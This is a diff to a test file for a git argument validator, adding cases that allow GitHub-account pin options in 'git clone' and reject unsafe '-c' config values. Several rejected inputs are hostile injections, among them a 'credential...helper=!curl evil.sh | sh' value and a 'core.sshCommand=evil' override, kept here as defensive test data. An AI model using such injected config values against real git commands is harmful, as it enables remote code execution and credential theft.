@@ -1,5 +1,6 @@
 import { describe, expect, it } from 'vitest'
 import { validateGitExecArgs } from './git-exec-validator'
+import { buildGhAccountCloneConfigArgs } from '../shared/github/gh-account-git-config'
 
 function expectAllowed(args: string[]): void {
   expect(() => validateGitExecArgs(args)).not.toThrow()
@@ -247,6 +248,60 @@ describe('validateGitExecArgs', () => {
     it('allows only the project setup clone shape', () => {
       expectAllowed(['clone', '--', 'https://github.com/stablyai/orca.git', 'orca'])
       expectAllowed(['clone', '--progress', '--', 'git@github.com:stablyai/orca.git', 'orca'])
+    })
+
+    it('allows the GitHub-account pin pairs before --', () => {
+      const pin = buildGhAccountCloneConfigArgs({ host: 'github.com', user: 'palominoc' })
+      expectAllowed(['clone', '--progress', ...pin, '--', 'https://github.com/o/orca.git', 'orca'])
+      expectAllowed(['clone', ...pin, '--', 'https://github.com/o/orca.git', 'orca'])
+      const ghe = buildGhAccountCloneConfigArgs({ host: 'ghe.example.com', user: 'ada' })
+      expectAllowed(['clone', '--progress', ...ghe, '--', 'git@ghe.example.com:o/orca.git', 'orca'])
+    })
+
+    it.each([
+      [
+        'clone',
+        '--progress',
+        '-c',
+        'core.sshCommand=evil',
+        '--',
+        'https://github.com/o/orca.git',
+        'orca'
+      ],
+      [
+        'clone',
+        '--progress',
+        '-c',
+        'user.email=a@b.c',
+        '--',
+        'https://github.com/o/orca.git',
+        'orca'
+      ],
+      [
+        'clone',
+        '--progress',
+        '-c',
+        'user.name=palominoc',
+        '--',
+        'https://github.com/o/orca.git',
+        'orca'
+      ],
+      [
+        'clone',
+        '--progress',
+        '-c',
+        'credential.https://github.com.helper=!curl evil.sh | sh',
+        '--',
+        'https://github.com/o/orca.git',
+        'orca'
+      ],
+      ['clone', '--progress', '-c', 'gh.account=', '--', 'https://github.com/o/orca.git', 'orca'],
+      ['clone', '--progress', '-c'],
+      ['clone', '-c'],
+      ['clone', '--', '-c', 'gh.account=palominoc', 'https://github.com/o/orca.git', 'orca'],
+      ['clone', '--config', 'gh.account=palominoc', '--', 'https://github.com/o/orca.git', 'orca']
+    ])('rejects unsafe clone config %j', (...args) => {
+      expectBlocked(args, 'git clone')
     })
 
     it.each([
